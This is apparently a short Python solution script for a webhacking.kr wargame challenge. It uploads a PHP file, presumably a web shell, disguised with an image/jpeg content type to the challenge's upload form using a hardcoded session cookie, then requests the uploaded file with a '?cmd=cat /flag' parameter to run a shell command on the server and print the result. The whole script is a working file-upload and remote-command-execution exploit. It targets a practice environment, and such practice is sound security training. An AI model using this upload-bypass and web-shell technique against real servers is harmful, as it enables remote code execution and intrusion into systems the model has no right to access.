import requests

URL = "http://webhacking.kr:10004"
UPLOAD_PATH = "/upload/"
PROB_URI = "/index.php"
UPLOAD_FILE = "payload.php"
PAYLOAD = "?cmd=cat /flag"
PHPSESSID = "0n7rge2jksvhu5np9cj6futrlk"

COOKIES = {
    "PHPSESSID": PHPSESSID
}

f = open(UPLOAD_FILE, 'rb')

FILE = {
    "file": (UPLOAD_FILE, f, 'image/jpeg')
}

resp = requests.post(url=URL + PROB_URI, cookies=COOKIES, files=FILE)

resp = requests.get(url=URL + UPLOAD_PATH + UPLOAD_FILE + PAYLOAD)

print(resp.text)
